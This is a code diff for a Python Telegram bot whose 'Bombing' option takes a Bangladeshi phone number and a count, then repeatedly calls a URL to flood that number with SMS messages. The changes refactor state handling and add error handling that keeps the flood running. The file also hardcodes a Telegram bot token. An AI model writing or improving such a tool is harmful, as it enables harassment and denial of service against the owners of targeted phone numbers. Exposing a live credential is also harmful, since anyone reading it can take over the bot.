@@ -1,11 +1,13 @@
 from telegram import Update, ReplyKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler,
+    ContextTypes, filters
+)
 import aiohttp
 
 BOT_TOKEN = "7151398287:AAG1K29dmUNkhNSjdquTti2eU-KnydfkOvw"
 
 ASK_NUMBER, ASK_LIMIT = range(2)
-user_data = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_keyboard = [["Bombing"]]
@@ -30,9 +32,9 @@ async def ask_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Invalid number. Try again with format 8801XXXXXXXXX:")
         return ASK_LIMIT
 
-    user_data[update.effective_chat.id] = {"number": number}
+    context.user_data["number"] = number
     await update.message.reply_text("How many SMS to send?")
-    return ConversationHandler.END  # এইটা ভুল ছিল!
+    return ConversationHandler.END
 
 async def get_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -41,9 +43,7 @@ async def get_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Please enter a valid number for limit.")
         return
 
-    chat_id = update.effective_chat.id
-    number = user_data.get(chat_id, {}).get("number")
-
+    number = context.user_data.get("number")
     if not number:
         await update.message.reply_text("Something went wrong. Start again with /start")
         return
@@ -55,11 +55,14 @@ async def get_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     async with aiohttp.ClientSession() as session:
         for _ in range(limit):
-            async with session.get(url) as resp:
-                if resp.status == 200:
-                    success += 1
-                else:
-                    fail += 1
+            try:
+                async with session.get(url) as resp:
+                    if resp.status == 200:
+                        success += 1
+                    else:
+                        fail += 1
+            except:
+                fail += 1
 
     await update.message.reply_text(f"Done!\nSuccess: {success}\nFailed: {fail}")
 
@@ -69,7 +72,6 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 
-# ConversationHandler শুধু নাম্বার আর limit নেওয়ার জন্য
 conv_handler = ConversationHandler(
     entry_points=[CommandHandler("start", start)],
     states={
@@ -79,7 +81,6 @@ conv_handler = ConversationHandler(
     fallbacks=[CommandHandler("cancel", cancel)],
 )
 
-# তারপর user SMS limit দিলে handle করবে আলাদা handler
 app.add_handler(conv_handler)
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, get_limit))  # আলাদা limit catcher
+app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, get_limit))
 app.run_polling()
